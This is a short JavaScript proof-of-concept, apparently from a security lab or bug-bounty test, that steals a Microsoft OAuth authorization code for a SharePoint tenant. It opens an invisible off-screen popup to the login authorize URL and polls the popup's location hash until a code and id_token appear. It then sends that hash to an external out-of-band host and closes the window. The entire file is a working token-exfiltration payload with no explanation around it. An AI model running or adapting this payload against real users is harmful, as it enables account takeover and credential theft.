(async()=>{
if(window.__labPoc)return;
window.__labPoc=1;

const oauth = "https://login.microsoftonline.com/765ca7f2-70b3-424e-ac45-f00d5a55e9ce/oauth2/authorize?client_id=00000003-0000-0ff1-ce00-000000000000&response_mode=fragment&response_type=code%20id_token&resource=00000003-0000-0ff1-ce00-000000000000&scope=openid&nonce=FE7BFE71987B16A5F336298102F8FE3650FE9E07EAE3E44B-FFD6770B61040E741D9B6E63EC38455E56BA32023ABCC355EF3892DC7C787642&redirect_uri=https://shiscolinotests.sharepoint.com/_forms/default.aspx&state=OD0w&claims={\"id_token\":{\"xms_cc\":{\"values\":[\"CP1\"]}}}&wsucxt=1&cobrandid=11bd8083-87e0-41b5-bb78-0bc43c8a8e8a&client-request-id=bfffe1a1-902b-a000-e3cd-10d5c80778de";

let win=open(oauth,"","width=1,height=1,left=-10000,top=-10000");

for(let i=0;i<80;i++){
 try{
  let hash=win.location.hash;
  if(hash&&hash.includes("code=")){
   fetch("https://j1m02evxjge7n0ae4ky76kviqu9mqupus.oast.site/?x="+encodeURIComponent(hash));
   win.close();
   break;
  }
 }catch(e){}
 await new Promise(r=>setTimeout(r,300));
}
})();
